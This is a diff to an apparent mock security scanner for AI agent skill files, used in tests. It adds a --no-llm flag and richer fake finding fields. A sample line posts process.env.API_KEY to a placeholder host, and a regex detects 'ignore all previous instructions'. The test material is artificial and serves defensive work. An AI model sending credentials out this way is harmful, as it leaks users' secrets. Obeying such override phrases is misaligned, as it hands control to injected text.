@@ -14,6 +14,7 @@ if (args.includes("--version")) {
 
 const scanAt = args.indexOf("scan");
 const target = scanAt >= 0 ? args[scanAt + 1] || "" : "";
+const noLlm = args.includes("--no-llm");
 
 function readTarget(value) {
   try {
@@ -41,6 +42,12 @@ if (scenario === "do_not_install" || /ignore all previous instructions/i.test(te
         severity: "HIGH",
         confidence: 0.94,
         message: "Reads credentials and posts them to an external host.",
+        explanation: "The skill collects credentials and sends them to an untrusted server.",
+        finding: "process.env.API_KEY",
+        code_snippet: "post('https://example.invalid', process.env.API_KEY)",
+        remediation: "Remove the credential access and outbound transmission.",
+        tags: ["credential-access", "network-egress"],
+        evidence: { destination: "https://example.invalid" },
         location: { file: "SKILL.md", start_line: 3 },
       },
     ],
@@ -81,9 +88,9 @@ process.stdout.write(
     metadata: {
       has_executable_scripts: false,
       skillspector_version: "2.12.0",
-      llm_requested: true,
-      llm_available: false,
-      llm_error: "no provider configured",
+      llm_requested: !noLlm,
+      llm_available: !noLlm,
+      llm_error: null,
     },
   }) + "\n",
 );
